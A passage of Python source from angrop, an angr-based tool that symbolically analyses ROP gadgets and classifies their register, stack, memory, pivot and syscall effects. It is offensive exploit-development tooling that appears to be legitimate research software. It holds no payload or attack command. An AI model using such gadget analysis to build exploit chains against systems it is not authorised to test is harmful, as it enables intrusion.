            simgr.run(n=2, filter_func=filter_func)
        except ValueError:
            return state
        if len(simgr.unconstrained) != 1:
            return state
        return simgr.unconstrained[0]

    @staticmethod
    def _control_to_transit_type(ctrl_type):
        match ctrl_type:
            case 'syscall':
                return None
            case 'pivot':
                return None
            case 'register':
                return "jmp_reg"
            case 'stack':
                return 'pop_pc'
            case 'memory':
                return "jmp_mem"
            case _:
                raise ValueError("Unknown control type")

    def _effect_analysis(self, gadget, init_state, final_state, ctrl_type, do_cond_branch):
        # compute sp change
        l.debug("... computing sp change")
        self._compute_sp_change(init_state, final_state, gadget)
        if (gadget.stack_change % self.project.arch.bytes) != 0:
            l.debug("... uneven sp change")
            return None

        # transit_type-based handling
        if ctrl_type is not None:
            transit_type = self._control_to_transit_type(ctrl_type)
            gadget.transit_type = transit_type
            arch_bits = self.project.arch.bits
            match transit_type:
                case 'pop_pc': # record pc_offset
                    idx = list(final_state.ip.variables)[0].split('_')[2]
                    gadget.pc_offset = int(idx) * self.project.arch.bytes
                    if gadget.pc_offset >= gadget.stack_change:
                        return None
                case 'jmp_reg': # record pc_reg
                    # TODO: we should support gadgets like `add rax, 0x1000; call rax`
                    # use test_chainbuilder.test_normalize_call as the testcase
                    if final_state.ip.depth > 1:
                        return None
                    gadget.pc_reg = list(final_state.ip.variables)[0].split('_', 1)[1].rsplit('-')[0]
                case 'jmp_mem': # record pc_target
                    # TODO: we currently don't support jmp_mem gadgets that look like
                    # pop rax; pop rbx; jmp [rax+rbx]
                    for a in reversed(final_state.history.actions):
                        if a.type == 'mem' and a.action == 'read' and a.size == arch_bits:
                            if (a.data.ast == final_state.ip).is_true():
                                gadget.pc_target = a.addr.ast
                                break
                    if gadget.pc_target is None:
                        return None

        # register effect analysis
        l.info("... checking for controlled regs")
        self._check_reg_changes(final_state, init_state, gadget)
        l.debug("... checking for reg moves")
        self._check_reg_change_dependencies(init_state, final_state, gadget)
        self._check_reg_movers(init_state, final_state, gadget)
        self._analyze_concrete_regs(final_state, gadget)
        self._check_pop_equal_set(gadget, final_state)

        # memory access analysis
        l.debug("... analyzing mem accesses")
        if not self._analyze_mem_access(final_state, init_state, gadget):
            l.debug("... too many symbolic memory accesses")
            return None

        for m_access in gadget.mem_writes + gadget.mem_reads + gadget.mem_changes:
            if not m_access.is_valid():
                l.debug("... mem access with no addr dependencies")
                return None

        gadget.bbl_addrs = list(x for x in final_state.history.bbl_addrs if not self.is_kernel_addr(x))
        gadget.isn_count = sum(self.project.factory.block(addr).instructions for addr in gadget.bbl_addrs)

        # conditional branch analysis
        if do_cond_branch:
            gadget = self._cond_branch_analysis(gadget, final_state)
        return gadget

    @staticmethod
    def _cond_branch_analysis(gadget, final_state):
        # list all conditional branch dependencies
        branch_guards = set()
        branch_guard_vars = set()
        for guard in final_state.history.jump_guards:
            if claripy.is_true(guard):
                continue
            branch_guards.add(guard)
            branch_guard_vars |= guard.variables

        # make sure all guards are controllable by us
        for var in branch_guard_vars:
            if var.startswith('sreg_') or var.startswith('symbolic_stack_'):
                continue
            return None

        # we do not consider a gadget having conditional branch if the branch guards can be set by itself
        gadget.has_conditional_branch = any(not v.startswith('symbolic_stack_') for v in branch_guard_vars)
        #gadget.has_conditional_branch = any(not v.startswith('symbolic_stack_') for v in branch_guard_vars)

        # if there is no conditional branch, good, we just finished the analysis
        if not branch_guards:
            return gadget

        # now analyze the branch dependencies and filter out gadgets that we do not support yet
        # TODO: support more guards such as existing flags
        def handle_constrained_var(var):
            if var.startswith("sreg_"):
                gadget.branch_dependencies.add(var.split('_', 1)[1].split('-', 1)[0])
            elif var.startswith("symbolic_stack_"):
                # we definitely can control this, but remove it from reg_pops
                to_remove = set()
                for pop in gadget.reg_pops:
                    reg = pop.reg
                    reg_val = final_state.registers.load(reg)
                    if var in reg_val.variables:
                        to_remove.add(pop)
                gadget.reg_pops -= to_remove

        for guard in branch_guards:
            if len(guard.variables) > 1:
                for var in guard.variables:
                    handle_constrained_var(var)
            else:
                var = list(guard.variables)[0]
                arg0 = guard.args[0]
                arg1 = guard.args[1]
                ast = arg0 if arg0.symbolic else arg1
                if rop_utils.loose_constrained_check(final_state, ast, extra_constraints=[guard]):
                    if var.startswith("sreg_"):
                        gadget.branch_dependencies.add(var.split('_', 1)[1].split('-', 1)[0])
                    continue
                handle_constrained_var(var)

        return gadget

    def _create_gadget(self, addr, init_state, final_state, ctrl_type, do_cond_branch):
        # create the gadget
        if ctrl_type == 'syscall' or self._does_syscall(final_state):
            # gadgets that do syscall and pivoting are too complicated
            if self._does_pivot(final_state):
                return None

            # FIXME: this try-except here is specifically for MIPS because angr
            # does not handle breakpoints in MIPS well
            try:
                prologue_state = rop_utils.step_to_syscall(init_state)
            except RuntimeError:
                return None
            g = RopGadget(addr=addr)
            if init_state.addr != prologue_state.addr:
                self._effect_analysis(g, init_state, prologue_state, None, do_cond_branch)
            gadget = SyscallGadget(addr=addr)
            gadget.prologue = g
        elif ctrl_type == 'pivot' or self._does_pivot(final_state):
            gadget = PivotGadget(addr=addr)
        else:
            gadget = RopGadget(addr=addr)

        gadget = self._effect_analysis(gadget, init_state, final_state, ctrl_type, do_cond_branch)
        return gadget

    def _analyze_concrete_regs(self, final_state, gadget):
        """
        collect registers that are concretized after symbolically executing the block (for example, xor rax, rax)
        """
        for reg in self.arch.reg_list:
            val = final_state.registers.load(reg)
            if val.symbolic:
                continue
            gadget.concrete_regs[reg] = final_state.solver.eval(val)

    def _check_reg_changes(self, final_state, _, gadget):
        """
        Checks which registers were changed and which ones were popped
        :param final_state: the stepped path, init_state is an ancestor of it.
        :param init_state: the input state for testing
        :param gadget: the gadget to store register change information
        """
        exit_action = final_state.history.actions[-1]
        if not isinstance(exit_action, angr.state_plugins.sim_action.SimActionExit):
            raise RopException("unexpected SimAction")

        exit_target = exit_action.target.ast # type: ignore

        stack_change = gadget.stack_change if type(gadget) == RopGadget else None

        for reg in self._get_reg_writes(final_state):
            # we assume any register in reg_writes changed
            # verify the stack controls it
            # we need to make sure they arent equal to the exit target otherwise they arent controlled
            # TODO what to do about moves to bp
            ast = final_state.registers.load(reg)
            if ast is exit_target or ast.variables.intersection(exit_target.variables):
                gadget.changed_regs.add(reg)
            elif self._check_if_stack_controls_ast(ast, final_state, stack_change):
                if ast.op == 'Concat':
                    raise RopException("cannot handle Concat")
                bits = self.project.arch.bits
                extended = rop_utils.bits_extended(ast)
                if extended is not None and bits == 64:
                    if extended <= 32:
                        bits = 32
                pop = RopRegPop(reg, bits)
                gadget.reg_pops.add(pop)
                gadget.changed_regs.add(reg)
            else:
                gadget.changed_regs.add(reg)

    def _check_reg_change_dependencies(self, symbolic_state, symbolic_p, gadget):
        """
        Checks which registers affect register changes
        :param symbolic_state: the input state for testing
        :param symbolic_p: the stepped path, symbolic_state is an ancestor of it.
        :param gadget: the gadget to store the reg change dependencies in
        """
        for reg in gadget.changed_regs:
            # skip popped regs
            if reg in gadget.popped_regs:
                continue
            # check its dependencies and controllers
            dependencies = self._get_reg_dependencies(symbolic_p, reg)
            if len(dependencies) != 0:
                gadget.reg_dependencies[reg] = set(dependencies)
                controllers = self._get_reg_controllers(symbolic_state, symbolic_p, reg, dependencies)
                if controllers:
                    gadget.reg_controllers[reg] = set(controllers)

    def _check_pop_equal_set(self, gadget, final_state):
        """
        identify the situation where the final registers are dependent on each other
        e.g. in `pop rax; mov rbx, rax; add rbx, 1; ret;` rax and rbx are set by the same variable
        """

        d = defaultdict(list)
        for reg in self.arch.reg_list:
            ast = final_state.registers.load(reg)
            for v in ast.variables:
                d[v].append(reg)
        for v, regs in d.items():
            if not regs:
                continue
            if not v.startswith("symbolic_stack"):
                continue
            gadget.pop_equal_set.add(tuple(regs))

    @staticmethod
    def _is_add_int(final_val, init_val):
        if final_val.depth != 2 or final_val.op not in ("__add__", "__sub__"):
            return False
        arg0 = final_val.args[0]
        arg1 = final_val.args[1]
        if arg0 is init_val:
            return not arg1.symbolic
        if arg1 is init_val:
            return not arg0.symbolic
        return False

    def _check_reg_movers(self, init_state, final_state, gadget):
        """
        Checks if any data is directly copied from one register to another
        :param init_state: the input state for testing
        :param final_state: the stepped path, symbolic_state is an ancestor of it.
        :param gadget: the gadget in which to store the reg movers
        :return:
        """
        for reg in gadget.changed_regs - gadget.popped_regs:
            final_val = final_state.registers.load(reg)
            if len(final_val.variables) != 1:
                continue
            var_name = list(final_val.variables)[0]
            if not var_name.startswith("sreg_"):
                continue
            from_reg = var_name[5:].split('-')[0]
            # rax->rax (32bit) is not a move, it is a register change
            if from_reg == reg:
                continue
            init_val = init_state.registers.load(from_reg)
            if init_val is final_val:
                gadget.reg_moves.append(RopRegMove(from_reg, reg, self.project.arch.bits))
            elif self._is_add_int(final_val, init_val): # rax = rbx + <int> should be also considered as move
                gadget.reg_moves.append(RopRegMove(from_reg, reg, self.project.arch.bits))
            else:
                # try lower 32 bits (this is intended for amd64)
                # TODO: do this for less bits too?
                half_bits = self.project.arch.bits // 2
                init_val = claripy.Extract(half_bits-1, 0, init_val)
                final_val = claripy.Extract(half_bits-1, 0, final_val)
                if init_val is final_val:
                    gadget.reg_moves.append(RopRegMove(from_reg, reg, half_bits))

    def _check_for_control_type(self, init_state, final_state):
        """
        :return: the data provenance of the controlled ip in the final state
        """

        ip = final_state.ip

        # this gadget arrives at a syscall
        if self.is_in_kernel(final_state):
            return 'syscall'

        # the ip is controlled by stack (ret)
        if self._check_if_stack_controls_ast(ip, final_state):
            return "stack"

        # the ip is not controlled by regs/mem
        if not ip.variables:
            return None
        ip_variables = list(ip.variables)

        # the ip is fully controlled by regs (jmp rax)
        if all(x.startswith("sreg_") for x in ip_variables):
            return "register"

        # the ip is fully controlled by memory and sp is not symbolic (jmp [rax])
        if all(x.startswith("symbolic_read_") for x in ip_variables) and not final_state.regs.sp.symbolic:
            return "memory"

        # this is a stack pivoting gadget
        if self._check_if_stack_pivot(init_state, final_state):
            return "pivot"

        return None

    @staticmethod
    def _check_if_jump_gadget(final_state, init_state):
        """
        FIXME: this constraint is too strict, it can be less strict
        a gadget is a jump gadget if
            1. it does not modify sp
            2. ip is overwritten by a general purpose register
        """
        # constraint 1
        if not init_state.solver.eval(final_state.regs.sp == init_state.regs.sp):
            return False

        # constraint 2
        ip = final_state.ip
        if len(ip.variables) > 1 or len(ip.variables) == 0:
            return False
        var = list(ip.variables)[0]
        if not var.startswith('sreg_'):
            return False

        return True

    @staticmethod
    def _check_if_stack_controls_ast(ast, final_state, gadget_stack_change=None):
        if gadget_stack_change is not None and gadget_stack_change <= 0:
            return False

        # TODO add test where we recognize a value past the end of the stack frame isn't controlled
        # this is an annoying problem but this code should handle it

        # prefilter
        if len(ast.variables) != 1 or not list(ast.variables)[0].startswith("symbolic_stack"):
            return False

        # check whether it is loosely constrained if it is constrained
        if ast.variables.intersection(final_state.solver._solver.variables):
            return rop_utils.loose_constrained_check(final_state, ast)
        # if it is not constrained, check whether it is a decent ast
        # (symbolic_stack_0_0_32 >> 0x1f) is not because we only control 1 bit
        return rop_utils.fast_unconstrained_check(final_state, ast)

    def _check_if_stack_pivot(self, init_state, final_state):
        ip_variables = list(final_state.ip.variables)
        if any(not x.startswith("symbolic_read_") for x in ip_variables):
            return None
        if len(final_state.regs.sp.variables) != 1:
            return None

        # check if we fully control sp
        if not init_state.solver.satisfiable(extra_constraints=[final_state.regs.sp == 0x41414100]):
            return None

        # make sure the control after pivot is reasonable

        # find where the ip is read from
        ip = final_state.ip
        saved_ip_addr = None
        for act in final_state.history.actions:
            if act.type == 'mem' and act.action == 'read':
                if (
                    act.size == self.project.arch.bits
                    and isinstance(act.data.ast, claripy.ast.BV)
                    and not (act.data.ast == ip).symbolic
                ):
                    if init_state.solver.eval(act.data.ast == ip):
                        saved_ip_addr = act.addr.ast
                        break
        if saved_ip_addr is None:
            return None

        # if the saved ip is too far away from the final sp, that's a bad gadget
        sols = final_state.solver.eval_to_ast(final_state.regs.sp - saved_ip_addr, 2)
        sols = [x.concrete_value for x in sols]
        if len(sols) != 1: # the saved ip has a symbolic distance from the final sp, bad
            return None
        offset = sols[0]
        if offset > self._stack_bsize: # filter out gadgets like mov rsp, rax; ret 0x1000
            return None
        if offset % self.project.arch.bytes != 0: # filter misaligned gadgets
            return None
        return "pivot"

    def _to_signed(self, value):
        bits = self.project.arch.bits
        if value >> (bits-1): # if the MSB is 1, this value is negative
            value -= (1<<bits)
        return value

    def _compute_sp_change(self, init_state, final_state, gadget):
        """
        Computes the change in the stack pointer for a gadget
        for a PivotGadget, it is the sp change right before pivoting
        :param symbolic_state: the input symbolic state
        :param gadget: the gadget in which to store the sp change
        """
        if type(gadget) in (RopGadget, SyscallGadget, RopBlock):
            dependencies = self._get_reg_dependencies(final_state, "sp")
            sp_change = final_state.regs.sp - init_state.regs.sp

            # analyze the results
            if len(dependencies) > 1:
                raise RopException("SP has multiple dependencies")
            if len(dependencies) == 0 and sp_change.symbolic:
                raise RopException("SP change is uncontrolled")
            assert not dependencies
            if len(dependencies) == 0 and not sp_change.symbolic:
                stack_changes = [init_state.solver.eval(sp_change)]
            elif list(dependencies)[0] == self.arch.stack_pointer:
                stack_changes = init_state.solver.eval_to_ast(sp_change, 2)
                stack_changes = [x.concrete_values for x in stack_changes]
            else:
                raise RopException("SP does not depend on SP or BP")

            if len(stack_changes) != 1:
                raise RopException("SP change is symbolic")

            gadget.stack_change = self._to_signed(stack_changes[0])
            if gadget.stack_change % self.project.arch.bytes != 0 or abs(gadget.stack_change) > 0x1000:
                raise RopException("bad SP")

        elif type(gadget) is PivotGadget:
            dependencies = self._get_reg_dependencies(final_state, "sp")
            last_sp = None
            init_sym_sp = None # type: ignore
            prev_act = None
            bits = self.project.arch.bits
            max_prev_pivot_sc = 0
            for act in final_state.history.actions:
                if act.type == 'mem' and not act.addr.ast.symbolic:
                    end = act.addr.ast.concrete_value + act.size//8
                    sc = end - self._concrete_sp
                    max_prev_pivot_sc = max(max_prev_pivot_sc, sc)
                if act.type == 'reg' and act.action == 'write' and act.size == bits and \
                            act.storage == self.arch.stack_pointer:
                    if not act.data.ast.symbolic:
                        last_sp = act.data.ast
                    else:
                        init_sym_sp = act.data.ast
                        break
                prev_act = act
            if last_sp is not None:
                gadget.stack_change = self._to_signed((last_sp - init_state.regs.sp).concrete_value)
            else:
                gadget.stack_change = 0

            gadget.stack_change_before_pivot = max_prev_pivot_sc

            if init_sym_sp is None:
                raise RopException("PivotGadget does not work with conditional branches")

            # if is popped from stack, we need to compensate for the popped sp value on the stack
            # if it is a pop, then sp comes from stack and the previous action must be a mem read
            # and the data is the new sp
            variables = init_sym_sp.variables
            if prev_act and variables and all(x.startswith('symbolic_stack_') for x in variables):
                if prev_act.type == 'mem' and prev_act.action == 'read' and prev_act.data.ast is init_sym_sp:
                    gadget.stack_change += self.project.arch.bytes

            assert init_sym_sp is not None
            sols = final_state.solver.eval_to_ast(final_state.regs.sp - init_sym_sp, 2)
            sols = [x.concrete_value for x in sols]
            if len(sols) != 1:
                raise RopException("This gadget pivots more than once, which is currently not handled")
            gadget.stack_change_after_pivot = sols[0]
            gadget.sp_reg_controllers = set(self._get_reg_controllers(init_state, final_state, 'sp', dependencies))
            gadget.sp_stack_controllers = {x for x in final_state.regs.sp.variables if x.startswith("symbolic_stack_")}
            if gadget.stack_change_before_pivot % self.project.arch.bytes != 0 or \
                    abs(gadget.stack_change_before_pivot) > 0x1000:
                raise RopException("bad SP")
            if gadget.stack_change_after_pivot % self.project.arch.bytes != 0 or \
                    abs(gadget.stack_change_after_pivot) > 0x1000:
                raise RopException("bad SP")
        else:
            raise NotImplementedError(f"Unknown gadget type {type(gadget)}")

    def _build_mem_access(self, a, gadget, init_state, final_state):
        """
        translate an angr symbolic action to angrop MemAccess
        """
        mem_access = RopMemAccess()

        # handle the memory access address
        # case 1: the address is not symbolic
        if not a.addr.ast.symbolic or all(x.startswith('sym_addr_') for x in a.addr.ast.variables):
            if not a.addr.ast.symbolic:
                addr_constant = a.addr.ast.concrete_value
            else:
                addr_constant = final_state.solver.eval(a.addr.ast)
            mem_access.addr_constant = addr_constant
            mem_access.stack_offset = addr_constant - init_state.regs.sp.concrete_value
            if not final_state.regs.sp.symbolic:
                # check whether this is a pointer to a known mapping, these are not considered out-of-patch
                if self.project.loader.find_object_containing(addr_constant):
                    pass
                elif not init_state.regs.sp.concrete_value <= addr_constant < final_state.regs.sp.concrete_value:
                    mem_access.out_of_patch = True
        # case 2: the symbolic address comes from registers
        elif all(x.startswith("sreg_") for x in a.addr.ast.variables):
            mem_access.addr_dependencies = rop_utils.get_ast_dependency(a.addr.ast)
            mem_access.addr_controllers = rop_utils.get_ast_controllers(init_state, a.addr.ast,
                                                                        mem_access.addr_dependencies)
            mem_access.addr_offset = rop_utils.get_ast_const_offset(init_state, a.addr.ast,
                                                                    mem_access.addr_dependencies)
        # case 3: the symbolic address comes from controlled stack
        elif all(x.startswith("symbolic_stack") for x in a.addr.ast.variables):
            mem_access.addr_stack_controllers = set(a.addr.ast.variables)
        # case 4: both, we don't handle it now yet
        else:
            raise RopException("angrop does not handle symbolic address that depends on both regs and stack atm")

        if a.action == "write":
            # for writes we want what the data depends on
            if a.data.ast.symbolic:
                mem_access.data_dependencies = rop_utils.get_ast_dependency(a.data.ast)
                mem_access.data_controllers = rop_utils.get_ast_controllers(init_state, a.data.ast,
                                                                            mem_access.data_dependencies)
            else:
                mem_access.data_constant = init_state.solver.eval(a.data.ast)
        elif a.action == "read":
            # for reads we want to know if any register will have the data after
            succ_state = final_state
            bits_to_extend = self.project.arch.bits - a.data.ast.size()
            # if bits_to_extend is negative it breaks everything, and we probably dont care about it
            if bits_to_extend >= 0:
                for reg in gadget.changed_regs:
                    # skip popped regs
                    if reg in gadget.popped_regs:
                        continue
                    # skip registers which have known dependencies
                    if reg in gadget.reg_dependencies and len(gadget.reg_dependencies[reg]) > 0:
                        continue
                    test_constraint = claripy.And(
                        succ_state.registers.load(reg) != a.data.ast.zero_extend(bits_to_extend),
                        succ_state.registers.load(reg) != a.data.ast.sign_extend(bits_to_extend))

                    if not succ_state.solver.satisfiable(extra_constraints=(test_constraint,)):
                        mem_access.data_dependencies.add(reg)

        data_ast = a.data.ast
        while data_ast.op in ('ZeroExt', 'SignExt'):
            data_ast = data_ast.args[1]
        mem_access.data_size = data_ast.size()
        mem_access.addr_size = a.addr.ast.size()
        return mem_access

    def _build_mem_change(self, read_action, write_action, gadget, init_state, final_state):
        # to change memory, write data must have at least two arguments:
        # <sym_read> <op> <data>, such as `add [rax], rbx`
        if len(write_action.data.ast.args) <= 1:
            return None

        # to change memory, the read must be symbolic and the write data must be derived from
        # the symbolic read data
        read_variables = {x for x in read_action.data.ast.variables if x.startswith('symbolic_read_unconstrained')}
        if not read_variables:
            return None
        write_variables = {x for x in write_action.data.ast.variables if x.startswith('symbolic_read_unconstrained')}
        if not read_variables.intersection(write_variables):
            return None

        # identify the symbolic data controller
        sym_data = None
        for d in write_action.data.ast.args:
            # filter out concrete values
            if not isinstance(d, claripy.ast.bv.BV):
                continue
            # filter out the symbolic read itself
            # FIXME: technically, there could be cases where the controller also comes from a symbolic read
            # but we don't handle it atm
            vs = d.variables
            if any(x.startswith('symbolic_read_unconstrained_') for x in vs):
                continue
            # TODO: we don't handle the cases where there are multiple data dependencies
            if sym_data is not None:
                return None
            sym_data = d
        if sym_data is None:
            return None

        # FIXME: here, if the action does a constant increment
        # such as mov rax, [rbx]; inc rax; mov [rbx], rax,
        # this gadget will be ignored by us, which is not great
        data_dependencies = rop_utils.get_ast_dependency(sym_data)
        data_controllers = set()
        data_stack_controllers = set()
        if len(data_dependencies):
            data_controllers = rop_utils.get_ast_controllers(init_state, sym_data, data_dependencies)
            if len(data_controllers) != 1:
                return None
        data_stack_controllers = {x for x in sym_data.variables if x.startswith('symbolic_stack')}


        mem_change = self._build_mem_access(read_action, gadget, init_state, final_state)
        mem_change.op = write_action.data.ast.op
        mem_change.data_dependencies = data_dependencies
        mem_change.data_stack_controllers = data_stack_controllers
        mem_change.data_controllers = data_controllers
        mem_change.data_size = write_action.data.ast.size()
        mem_change.addr_size = write_action.addr.ast.size()
        return mem_change

    def _does_syscall(self, symbolic_p):
        """
        checks if the path does a system call at some point
        :param symbolic_p: input path of which to check history
        """
        for addr in symbolic_p.history.bbl_addrs:
            if self.project.simos.is_syscall_addr(addr):
                return True

        return False

    def _is_pivot_action(self, act):
        """
        check whether an sim_action is a stack pivoting action
        """
        if act.type != 'reg' or act.action != 'write':
            return False
        try:
            storage = act.storage
        except KeyError:
            return False
        if storage != self.arch.stack_pointer:
            return False
        # this gadget has done symbolic pivoting if there is a symbolic write to the stack pointer
        if act.data.symbolic:
            return True
        return False

    def _does_pivot(self, final_state):
        """
        checks if the path does a stack pivoting at some point
        :param final_state: the state that finishes the gadget execution
        """
        for act in final_state.history.actions:
            if self._is_pivot_action(act):
                return True
        return False

    def _analyze_mem_access(self, final_state, init_state, gadget):
        """
        analyzes memory accesses and stores their info in the gadget
        :param final_state: the stepped state, init_state is an ancestor of it.
        :param init_state: the input state for testing
        :param gadget: the gadget to store mem acccess in
        """
        all_mem_actions = []
        sp_vars = final_state.regs.sp.variables
        pivot_done = False

        # step 1: filter out irrelevant actions and irrelevant memory accesses
        for a in final_state.history.actions.hardcopy:
            if self._is_pivot_action(a):
                pivot_done = True
                continue

            if a.type != 'mem':
                continue

            # we don't like floating point stuff
            if isinstance(a.data.ast, (claripy.ast.FP)):
                continue

            # ignore read/write on stack after pivot
            if pivot_done and a.addr.ast.symbolic and not a.addr.ast.variables - sp_vars:
                continue

            # ignore read/write within the stack patch
            if not a.addr.ast.symbolic:
                addr_constant = a.addr.ast.concrete_value

                # check whether the access is within the stack patch
                # we ignore pushes, which will lead to under patch write then load
                upper_bound = (1<<final_state.project.arch.bits)-1
                if not final_state.regs.sp.symbolic:
                    upper_bound = final_state.regs.sp.concrete_value
                if init_state.regs.sp.concrete_value-0x20 <= addr_constant < upper_bound:
                    continue
                if a.action == 'read' and any(x.startswith('uninitialized') for x in a.data.variables):
                    return False

            # ignore read/write in known segments
            if not a.addr.ast.symbolic:
                addr_constant = a.addr.ast.concrete_value
                found = False
                for seg in self.project.loader.main_object.segments:
                    min_addr = seg.min_addr
                    max_addr = math.ceil(seg.max_addr / 0x1000)*0x1000
                    if min_addr <= addr_constant < max_addr:
                        found = True
                        break
                if found is True:
                    continue

            # error out on invalid memory accesses
            if not a.addr.ast.symbolic:
                if abs(init_state.regs.sp.concrete_value - a.addr.ast.concrete_value) > 0x400:
                    return False

            all_mem_actions.append(a)

        # step 2: identify memory change accesses by indexing using the memory address as the key
        # specifically, if there is a read/write sequence on the same memory address,
        # and no subsequent memory actions on that same address, then the two actions will be
        # merged into a memory change action
        d = defaultdict(list)
        for a in all_mem_actions:
            d[a.addr.ast].append(a)
        to_del = set()
        for addr, actions in d.items():
            if len(actions) != 2:
                continue
            if actions[0].action != 'read' or actions[1].action != 'write':
                continue
            mem_change = self._build_mem_change(actions[0], actions[1], gadget, init_state, final_state)
            if mem_change:
                to_del.add(addr)
                gadget.mem_changes.append(mem_change)
        for addr in to_del:
            for m in d[addr]:
                all_mem_actions.remove(m)

        sym_accesses = [ m for m in all_mem_actions if m.addr.ast.symbolic ]
        sym_accesses += [m for m in gadget.mem_changes if m.is_symbolic_access()]
        if len(sym_accesses) > self.arch.max_sym_mem_access:
            return False

        # step 3: add all left memory actions to either read/write memory accesses stashes
        for a in all_mem_actions:
            mem_access = self._build_mem_access(a, gadget, init_state, final_state)
            if a.action == "read":
                gadget.mem_reads.append(mem_access)
            if a.action == "write":
                gadget.mem_writes.append(mem_access)
        return True

    def _windup_to_presyscall_state(self, final_state, init_state):
        """
        Retrieve the state of a gadget just before the syscall is made
        :param symbolic_p: the stepped path, symbolic_state is an ancestor of it.
        :param symbolic_state: input state for testing
        """

        if self._does_syscall(final_state) or self.is_in_kernel(final_state):
            # step up until the syscall and save the possible syscall numbers into the gadget
            prev = cur = init_state.copy()
            while not self._does_syscall(cur) and not self.is_in_kernel(cur):
                tmp = rop_utils.step_one_inst(self.project, cur.copy(), stop_at_syscall=True)
                prev = cur
                cur = tmp
            return prev.copy()

        raise RopException("Gadget passed to _windup_to_presyscall_state does not make a syscall")

    # UTILITY FUNCTIONS

    @staticmethod
    def _get_reg_dependencies(symbolic_p, test_reg):
        """
        Gets all the registers which affect a test register
        :param symbolic_p: the stepped path, symbolic_state is an ancestor of it.
        :param test_reg: the register of which we are trying to analyze dependencies
        :return: A set of register names which affect the test_reg
        """
        dependencies = rop_utils.get_ast_dependency(symbolic_p.registers.load(test_reg))
        return dependencies

    @staticmethod
    def _get_reg_controllers(symbolic_state, symbolic_p, test_reg, reg_deps):
        """
        Gets all the registers which can completely control a test register
        :param symbolic_state: the input state for testing
        :param symbolic_p: the stepped path, symbolic_state is an ancestor of it.
        :param test_reg: the register which we are trying to analyze controllers
        :param reg_deps: All registers which it depends on
        :return: A set of register names which can control the test_reg
        """
        controllers = rop_utils.get_ast_controllers(symbolic_state, symbolic_p.registers.load(test_reg), reg_deps)
        return controllers

    def _get_reg_writes(self, path):
        """
        Finds all the registers written in a path
        :param path: The path to check
        :return: A set of register names which are read
        """
        all_reg_writes = set()
        for a in reversed(path.history.actions):
            if a.type == "reg" and a.action == "write":
                try:
                    reg_name = rop_utils.get_reg_name(self.project.arch, a.offset)
                    if reg_name in self.arch.reg_list:
                        all_reg_writes.add(reg_name)
                    elif reg_name != self.arch.stack_pointer:
                        l.info("reg write from register not in reg_set: %s", reg_name)
                except RegNotFoundException as e:
                    l.debug(e)
        return all_reg_writes

    def _block_has_ip_relative(self, addr, bl):
        """
        Checks if a block has any ip relative instructions
        """
        # if thumb mode, the block needs to parsed very carefully
        if addr & 1 == 1 and self.project.arch.bits == 32 and self.project.arch.name.startswith('ARM'):
            # thumb mode has this conditional instruction thingy, which is terrible for vex statement
            # comparison. We inject a ton of fake statements into the program to ensure vex that this gadget
            # is not a conditional instruction
            MMAP_ADDR = 0x1000
            test_addr = MMAP_ADDR + 0x200+1
            if self.project.loader.memory.min_addr > MMAP_ADDR:
                # a ton of `pop {pc}`
                self.project.loader.memory.add_backer(MMAP_ADDR, b'\x00\xbd'*0x100+b'\x00'*0x200)

            # create the block without using the cache
            engine = self.project.factory.default_engine
            bk = engine._use_cache
            engine._use_cache = False
            self.project.loader.memory.store(test_addr-1, bl.bytes + b'\x00'*(0x200-len(bl.bytes)))
            bl2 = self.project.factory.block(test_addr)
            engine._use_cache = bk
        else:
            test_addr = 0x41414140 + addr % 0x10
            bl2 = self.project.factory.block(test_addr, insn_bytes=bl.bytes)

        # now diff the blocks to see whether anything constants changes
        try:
            diff_constants = differing_constants(bl, bl2)
        except UnmatchedStatementsException:
            return True
        # check if it changes if we move it
        bl_end = addr + bl.size
        bl2_end = test_addr + bl2.size
        filtered_diffs = []
        for d in diff_constants:
            if d.value_a < addr or d.value_a >= bl_end or \
                    d.value_b < test_addr or d.value_b >= bl2_end:
                filtered_diffs.append(d)
        return len(filtered_diffs) > 0

    def _is_simple_gadget(self, addr, block):
        """
        is the gadget a simple gadget like
        pop rax; ret
        """
        if block.vex.jumpkind not in {'Ijk_Boring', 'Ijk_Call', 'Ijk_Ret'}:
            return False
        if block.vex.jumpkind.startswith('Ijk_Sys_'):
            return False
        if block.vex.constant_jump_targets:
            return False
        if self._block_has_ip_relative(addr, block):
            return False
        return True

    def block_hash(self, block):
        """
        a hash to uniquely identify a simple block
        """
        if block.vex_nostmt.jumpkind.startswith('Ijk_Sys_'):
            next_addr = block.addr + block.size
            obj = self.project.loader.find_object_containing(next_addr)
            if not obj:
                return block.bytes
            next_block = self.project.factory.block(next_addr, skip_stmts=True)
            return block.bytes + next_block.bytes
        return block.bytes

    def _static_analyze_first_block(self, addr):
        try:
            bl = self.project.factory.block(addr, skip_stmts=True)
            if bl.size > self.arch.max_block_size:
                return None, None
            jumpkind = bl._vex_nostmt.jumpkind
            if jumpkind in ('Ijk_SigTRAP', 'Ijk_NoDecode', 'Ijk_Privileged', 'Ijk_Yield'):
                return None, None
            if not self._allow_conditional_branches and len(bl._vex_nostmt.constant_jump_targets) > 1:
                return None, None
            if self._fast_mode and jumpkind not in ("Ijk_Ret", "Ijk_Boring") and not jumpkind.startswith('Ijk_Sys_'):
                return None, None
            if bl._vex_nostmt.instructions == 1 and jumpkind in ('Ijk_Boring', 'Ijk_Call'):
                return None, None
            if not self._block_make_sense(addr):
                return None, None
        except (SimEngineError, SimMemoryError):
            return None, None
        if self._is_simple_gadget(addr, bl):
            h = self.block_hash(bl)
            return h, addr
        return None, addr

```

`angrop/rop.py`:

```py
import pickle
import inspect
import logging
from typing import cast

from angr import Analysis, register_analysis

from . import chain_builder
from .gadget_finder import GadgetFinder
from .rop_gadget import RopGadget, PivotGadget, SyscallGadget

l = logging.getLogger('angrop.rop')

class ROP(Analysis):
    """
    This class is a semantic aware rop gadget finder
    It is a work in progress, so don't be surprised if something doesn't quite work

    After calling find_gadgets(), find_gadgets_single_threaded() or load_gadgets(),
    self.rop_gadgets, self.pivot_gadgets, self.syscall_gadgets are populated.
    Additionally, all public methods from ChainBuilder are copied into ROP.
    """

    def __init__(self, only_check_near_rets=True, max_block_size=None, max_sym_mem_access=None,
                 fast_mode=None, rebase=None, is_thumb=False, kernel_mode=False, stack_gsize=80,
                 cond_br=False, max_bb_cnt=2
                 ):
        """
        Initializes the rop gadget finder
        :param only_check_near_rets: If true we skip blocks that are not near rets
        :param max_block_size: limits the size of blocks considered, longer blocks are less likely to be good rop
                               gadgets so we limit the size we consider
        :param fast_mode: True/False, if set to None makes a decision based on the size of the binary
                          if True, skip gadgets with conditonal_branches, floating point operations, jumps
